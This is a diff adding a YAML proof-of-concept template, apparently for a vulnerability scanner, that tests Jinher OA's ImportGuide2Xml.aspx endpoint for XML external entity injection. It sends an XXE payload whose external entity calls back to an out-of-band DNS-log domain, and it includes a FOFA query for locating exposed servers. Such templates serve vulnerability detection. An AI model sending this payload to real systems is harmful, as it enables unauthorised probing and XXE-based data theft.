@@ -1,0 +1,37 @@
+id: poc-yaml-jinher-importguide2xml-aspx-xxe
+info:
+  name: 金和OA ImportGuide2Xml.aspx XXE漏洞
+  severity: high
+  tags:
+  - xxe
+  - DNSLOG
+  finger: 金和OA
+  fofa: app="金和网络-金和OA"
+variables:
+  reverse: new_dns_log()
+  domain: reverse.Domain()
+requests:
+- method: GET
+  path: /C6/Jhsoft.Web.login/PassWordSlideFull.aspx
+  expression: contains(body,"JHSoft")
+- method: POST
+  path: /c6/Jhsoft.Web.Appraise/ImportGuide2Xml.aspx/
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: '<?xml version="1.0" encoding="UTF-8"?>
+
+    <!DOCTYPE root [
+
+    <!ENTITY % remote SYSTEM "https://{{.domain}}/xxe_test">
+
+    %remote;]>
+
+    <root/>'
+  expression: 'status_code == 200 &&
+
+    body == "" &&
+
+    reverse.Verify()
+
+    '
+transport: http
